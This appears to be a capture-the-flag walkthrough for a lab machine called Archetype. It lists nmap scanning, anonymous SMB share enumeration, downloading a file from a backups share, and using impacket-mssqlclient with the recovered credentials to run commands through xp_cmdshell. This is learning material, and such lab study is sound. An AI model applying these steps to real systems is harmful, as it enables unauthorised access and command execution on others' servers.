# Archetype

{% stepper %}
{% step %}
### Enumerate with nmap

* Run [Broken link](broken-reference "mention") with `nmap -T4 <ip_address>`
* On port 1433 we see ms-sql-s is running.
{% endstep %}

{% step %}
### Enumerate the SMB server

* We can get more data with `smbclient -L <target_IP> -N`
* Non-admin accounts don't have the `$` on the end
{% endstep %}

{% step %}
### Download files from the SMB server

* `smbclient \\\\<target_IP>\\backups` (connect)
* `get <filename>` (download file)
* look in your current working directory for the downloaded file
{% endstep %}

{% step %}
### Enumerate with impacket

* Now we have the my-sql credentials we can use [Broken link](broken-reference "mention") to authenticate and get a shell.
* `impacket-mssqlclient <username>:<password>@<target_IP> -windows-auth` (default port is 1433)
* `xp_cmdshell dir` (run dir command)
{% endstep %}
{% endstepper %}
